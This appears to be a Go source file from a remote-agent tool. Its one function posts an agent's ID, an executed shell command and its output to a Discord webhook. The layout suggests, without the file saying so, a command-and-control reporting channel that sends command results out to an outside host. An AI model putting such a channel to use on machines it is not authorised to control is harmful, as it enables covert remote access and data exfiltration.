package discord

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

// Message represents the JSON payload sent to Discord
type Message struct {
	Content string `json:"content"`
}

const discordMaxLength = 2000

func SendToDiscord(agentId string, command string, output string) {
	webhookURL := os.Getenv("DISCORD_WEBHOOK_URL")
	if webhookURL == "" {
		fmt.Println("Error: DISCORD_WEBHOOK_URL environment variable not set")
		os.Exit(1)
	}

	header := "[Agent: " + agentId + "]\n$ " + command + "\n```\n"
	footer := "\n```"
	maxOutput := discordMaxLength - len(header) - len(footer)
	if len(output) > maxOutput {
		output = output[:maxOutput]
	}

	message := Message{Content: header + output + footer}

	// Convert the message struct to JSON
	jsonData, err := json.Marshal(message)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		os.Exit(1)
	}

	// Send the POST request
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error sending POST request:", err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	// Discord returns 204 No Content for a successful request
	if resp.StatusCode == http.StatusNoContent {
		fmt.Println("[+] Message sent successfully!")
	} else {
		fmt.Println("[-] Error: Received unexpected response status:", resp.Status)
	}
}
